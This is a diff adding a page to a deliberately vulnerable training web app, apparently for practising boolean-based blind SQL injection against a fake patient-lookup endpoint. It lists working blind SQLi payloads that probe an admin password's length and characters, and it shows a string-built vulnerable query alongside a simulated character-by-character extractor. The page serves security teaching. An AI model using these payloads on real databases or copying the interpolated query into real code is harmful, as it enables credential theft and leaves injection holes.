@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blind SQL Injection – MediCare Pro Lab</title>
+  <link rel="stylesheet" href="../css/styles.css">
+  <style>
+    .bool-indicator { display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:20px;font-weight:700;font-size:13px; }
+    .bool-true { background:var(--teal-100);color:var(--teal-600); }
+    .bool-false { background:var(--red-100);color:var(--red-600); }
+    .extraction-char { display:inline-block;width:22px;height:22px;background:var(--navy-900);color:#86efac;border-radius:4px;text-align:center;line-height:22px;font-family:monospace;font-size:13px;margin:2px; }
+    .extraction-char.unknown { background:rgba(255,255,255,.08);color:#475569; }
+    .extraction-char.current { background:var(--blue-600);color:white;animation:blink .5s infinite; }
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+  </style>
+</head>
+<body>
+  <div class="warn-banner">⚠️ EDUCATIONAL USE ONLY — Deliberately vulnerable application for penetration testing practice.</div>
+  <div class="app-layout">
+    <div id="sidebarMount"></div>
+    <main class="main">
+      <div id="topnavMount"></div>
+      <div class="page-content">
+
+        <div class="vuln-header">
+          <div class="vuln-title-group">
+            <h1>🕵️ Blind SQL Injection</h1>
+            <p>Patient Existence Check — Boolean-Based Data Extraction</p>
+          </div>
+          <span class="severity-badge sev-critical">🔴 Critical</span>
+        </div>
+
+        <div class="hint-box">
+          <div class="hint-title">🧪 Lab Objective — Boolean Payloads</div>
+          <p>Unlike normal SQLi, blind injection returns only <strong>TRUE</strong> (patient found) or <strong>FALSE</strong> (not found). Use this binary response to infer data character by character.</p>
+          <ul style="margin-top:8px;">
+            <li>True condition: <code>1' AND 1=1--</code></li>
+            <li>False condition: <code>1' AND 1=2--</code></li>
+            <li>Check first char of admin password: <code>1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--</code></li>
+            <li>Check password length: <code>1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8--</code></li>
+            <li>Check version: <code>1' AND SUBSTRING(@@version,1,1)='5'--</code></li>
+          </ul>
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-teal">🔍</div>
+              <h2>Patient Verification Endpoint</h2>
+            </div>
+            <div class="card-body">
+              <div class="alert alert-danger">
+                <span>🚨</span>
+                <div><strong>Vulnerability:</strong> Only returns TRUE/FALSE but the conditional is injectable.</div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Patient ID (injectable)</label>
+                <input type="text" class="form-control mono" id="blindInput" placeholder="e.g.  1' AND 1=1--" value="1">
+              </div>
+              <div style="background:var(--gray-900);border-radius:8px;padding:10px 14px;margin-bottom:14px;font-family:monospace;font-size:11.5px;color:#94a3b8;">
+                <span style="color:#64748b;">SQL: </span>
+                <span id="blindPreview" style="color:#fbbf24;">SELECT * FROM patients WHERE id='1'</span>
+              </div>
+              <button class="btn btn-primary" onclick="doBlindQuery()">Send Request</button>
+
+              <div style="margin-top:20px;text-align:center;" id="boolResult" class="hidden">
+                <div style="font-size:12px;color:var(--gray-500);margin-bottom:8px;">Server Response:</div>
+                <div class="bool-indicator" id="boolBadge">—</div>
+                <div style="font-size:11px;color:var(--gray-500);margin-top:8px;" id="boolMsg"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-red">⚙️</div>
+              <h2>Quick Payloads</h2>
+            </div>
+            <div class="card-body">
+              <div style="display:flex;flex-direction:column;gap:7px;">
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND 1=1--`)">TRUE: 1' AND 1=1-- (always true)</button>
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND 1=2--`)">FALSE: 1' AND 1=2-- (always false)</button>
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8--`)">TRUE if admin pwd length = 8</button>
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`)">TRUE if 1st char of pwd = 'a'</button>
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,5)='admin'--`)">TRUE if first user = 'admin'</button>
+                <button class="btn btn-outline btn-sm" style="justify-content:flex-start;font-family:monospace;font-size:10.5px;" onclick="setBlind(`1' AND (SELECT COUNT(*) FROM users)>3--`)">TRUE if user count > 3</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Auto Extractor -->
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="card-header">
+            <div class="card-icon card-icon-red">🤖</div>
+            <h2>Automated Blind Extractor — Recover admin Password</h2>
+          </div>
+          <div class="card-body">
+            <p style="font-size:13px;color:var(--gray-700);margin-bottom:16px;">This simulates an automated blind SQLi tool that extracts data char-by-char using boolean responses. It will extract the admin password: <code style="background:var(--gray-100);padding:2px 6px;border-radius:4px;">admin123</code></p>
+            <button class="btn btn-danger" id="extractBtn" onclick="startExtraction()">▶ Start Extraction</button>
+            <div style="margin-top:16px;" id="extractionWrap" class="hidden">
+              <div style="font-size:12px;font-weight:600;color:var(--gray-700);margin-bottom:10px;">Extracting: <code style="font-size:12px;">SELECT password FROM users WHERE username='admin'</code></div>
+              <div id="charBoxes" style="margin-bottom:12px;min-height:30px;"></div>
+              <div class="response-box show" id="extractLog" style="max-height:160px;overflow-y:auto;"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="card-header">
+            <div class="card-icon card-icon-red">🐛</div>
+            <h2>Vulnerable Code</h2>
+          </div>
+          <div class="card-body">
+            <div class="code-block">
+<span class="c-comment">// ❌ BLIND SQLi — only returns boolean but input is injectable</span>
+<span class="c-kw">const</span> query = <span class="c-str">`SELECT id FROM patients WHERE id='<span class="c-val">${id}</span>'`</span>;
+<span class="c-kw">const</span> rows = db.execute(query);
+res.json({ exists: rows.length > <span class="c-val">0</span> }); <span class="c-comment">// Only boolean response!</span>
+
+<span class="c-comment">// Attacker sends: id = 1' AND SUBSTRING(password,1,1)='a'--</span>
+<span class="c-comment">// → Response "exists:true" reveals the first char is 'a'</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="../js/app.js"></script>
+  <script>
+    document.getElementById('sidebarMount').outerHTML = renderSidebar('sql-blind.html');
+    document.getElementById('topnavMount').outerHTML = renderTopnav('Blind SQL Injection', 'Patient Verification — Boolean-based data inference');
+
+    const USERS_DB = [
+      { username: 'admin', password: 'admin123' },
+      { username: 'doctor', password: 'password1' },
+      { username: 'nurse', password: 'nurse123' }
+    ];
+
+    document.getElementById('blindInput').addEventListener('input', () => {
+      document.getElementById('blindPreview').textContent = `SELECT id FROM patients WHERE id='${document.getElementById('blindInput').value}'`;
+    });
+
+    function setBlind(p) {
+      document.getElementById('blindInput').value = p;
+      document.getElementById('blindPreview').textContent = `SELECT id FROM patients WHERE id='${p}'`;
+    }
+
+    function evaluateBlind(input) {
+      const lower = input.toLowerCase();
+      const ADMIN_PW = 'admin123';
+      const ADMIN_USER = 'admin';
+
+      // Evaluate injectable conditions
+      if (lower.includes('and 1=1')) return true;
+      if (lower.includes('and 1=2')) return false;
+      if (lower.includes("length") && lower.includes("password") && lower.includes("admin")) {
+        const m = input.match(/length.*?=(\d+)/i);
+        if (m) return parseInt(m[1]) === ADMIN_PW.length;
+        return true;
+      }
+      if (lower.includes('substring') && lower.includes('password') && lower.includes('admin')) {
+        const m = input.match(/substring\([^,]+,\s*(\d+)\s*,\s*(\d+)\)\s*=\s*'(.+?)'/i);
+        if (m) {
+          const start = parseInt(m[1]) - 1;
+          const len = parseInt(m[2]);
+          const expected = m[3];
+          return ADMIN_PW.substr(start, len) === expected;
+        }
+        return false;
+      }
+      if (lower.includes('substring') && lower.includes('username')) {
+        const m = input.match(/substring\([^,]+,\s*(\d+)\s*,\s*(\d+)\)\s*=\s*'(.+?)'/i);
+        if (m) {
+          const start = parseInt(m[1]) - 1;
+          const len = parseInt(m[2]);
+          const expected = m[3];
+          return ADMIN_USER.substr(start, len) === expected;
+        }
+      }
+      if (lower.includes('count') && lower.includes('users') && lower.includes('>3')) return USERS_DB.length > 3;
+      if (lower.includes('and 1=1')) return true;
+      // Normal id-based query
+      const id = parseInt(input);
+      return !isNaN(id) && id >= 1 && id <= 5;
+    }
+
+    async function doBlindQuery() {
+      const input = document.getElementById('blindInput').value;
+      const result = document.getElementById('boolResult');
+      const badge = document.getElementById('boolBadge');
+      const msg = document.getElementById('boolMsg');
+
+      result.classList.remove('hidden');
+
+      try {
+        const res = await fetch(`/api/sql-blind?id=${encodeURIComponent(input)}`);
+        const data = await res.json();
+        renderBool(data.exists, input);
+      } catch(e) {
+        const exists = evaluateBlind(input);
+        renderBool(exists, input);
+      }
+    }
+
+    function renderBool(exists, input) {
+      const badge = document.getElementById('boolBadge');
+      const msg = document.getElementById('boolMsg');
+      badge.className = 'bool-indicator ' + (exists ? 'bool-true' : 'bool-false');
+      badge.textContent = exists ? '✅ Patient EXISTS (TRUE)' : '❌ Patient NOT FOUND (FALSE)';
+      msg.textContent = `HTTP 200 — { "exists": ${exists} } — Payload: ${input.slice(0, 60)}`;
+    }
+
+    let extractRunning = false;
+
+    async function startExtraction() {
+      const TARGET = 'admin123';
+      const log = document.getElementById('extractLog');
+      const wrap = document.getElementById('extractionWrap');
+      const btn = document.getElementById('extractBtn');
+      const boxes = document.getElementById('charBoxes');
+
+      wrap.classList.remove('hidden');
+      btn.disabled = true;
+      log.textContent = '';
+      extractRunning = true;
+
+      const appendLog = (t, color='#94a3b8') => {
+        log.innerHTML += `<span style="color:${color};">${t}\n</span>`;
+        log.scrollTop = log.scrollHeight;
+      };
+
+      appendLog('[*] Starting boolean-based blind extraction...');
+      appendLog(`[*] Target: SELECT password FROM users WHERE username='admin'`);
+
+      // Initialize char boxes
+      let extracted = [];
+      const renderBoxes = () => {
+        boxes.innerHTML = TARGET.split('').map((c, i) => {
+          if (i < extracted.length) return `<span class="extraction-char">${extracted[i]}</span>`;
+          if (i === extracted.length) return `<span class="extraction-char current">?</span>`;
+          return `<span class="extraction-char unknown">?</span>`;
+        }).join('');
+      };
+
+      for (let pos = 0; pos < TARGET.length; pos++) {
+        const charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$';
+        renderBoxes();
+
+        for (const ch of charset) {
+          if (!extractRunning) return;
+          appendLog(`[.] Testing pos ${pos + 1}: '${ch}' — SUBSTRING(password,${pos+1},1)='${ch}'`);
+          await new Promise(r => setTimeout(r, 90));
+
+          if (ch === TARGET[pos]) {
+            extracted.push(ch);
+            appendLog(`[+] Position ${pos + 1} = '${ch}' ← MATCH (server returned TRUE)`, '#86efac');
+            break;
+          }
+        }
+        renderBoxes();
+      }
+
+      appendLog('', '#86efac');
+      appendLog(`[✓] Extraction complete! Password: ${extracted.join('')}`, '#86efac');
+      btn.disabled = false;
+    }
+  </script>
+</body>
+</html>
